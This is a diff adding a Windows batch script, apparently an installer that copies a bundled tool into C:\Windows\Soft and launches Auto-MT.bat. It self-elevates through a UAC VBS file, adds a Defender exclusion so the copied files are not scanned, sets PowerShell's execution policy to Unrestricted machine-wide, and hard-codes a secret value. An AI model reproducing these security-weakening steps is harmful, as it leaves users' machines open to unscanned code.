@@ -1,0 +1,40 @@
+ÿþ
+cls
+@echo off
+@echo off
+:: --- DOAN CODE CHONG TREO KHI CLICK CHUOT (DISABLE QUICKEDIT) ---
+powershell -InputFormat None -OutputFormat None -NonInteractive -Command "$w=Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")]public static extern bool GetConsoleMode(IntPtr h,out uint m);[DllImport(\"kernel32.dll\")]public static extern bool SetConsoleMode(IntPtr h,uint m);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetStdHandle(int h);' -Name 'Win32' -PassThru;$h=$w::GetStdHandle(-10);$m=0;$w::GetConsoleMode($h,[ref]$m);$w::SetConsoleMode($h,$m -band 0xFFBF)"
+:: ----------------------------------------------------------------
+
+:: --- PHAN 1: TU DONG LAY QUYEN ADMIN ---
+set "params=%*"
+cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
+
+:: --- PHAN 2: CAU HINH MOI TRUONG ---
+echo Dang khoi tao moi truong...
+
+:: 1. Tao thu muc C:\Windows\Soft
+if not exist "C:\Windows\Soft" mkdir "C:\Windows\Soft"
+
+:: 2. Them Exclusion (Vung an toan) - De copy khong bi bao virus
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath 'C:\Windows\Soft'"
+
+:: 3. Mo khoa PowerShell
+powershell -inputformat none -outputformat none -NonInteractive -Command "Set-ExecutionPolicy Unrestricted -Scope LocalMachine -Force"
+
+:: --- PHAN 3: COPY VA CHAY (DA SUA LOI LONG THU MUC) ---
+echo Dang chuan bi file...
+
+:: QUAN TRONG: Them "\*" o cuoi de chi copy FILE BEN TRONG, khong copy ca thu muc vo.
+:: /i: xac nhan dich la thu muc, /y: ghi de khong hoi
+xcopy /e /y /i "%~dp0soft\Soft\*" "C:\Windows\Soft\" >nul
+
+echo Dang khoi dong Auto-MT...
+:: --- TAO CHIA KHOA BI MAT TRUOC KHI GOI FILE CHINH ---
+set "PV_SECRET=PhongVu@123"
+:: ----------------------------------------------------
+:: Chuyen vao dung thu muc va chay
+cd /d "C:\Windows\Soft"
+start "" "Auto-MT.bat"
+
+exit
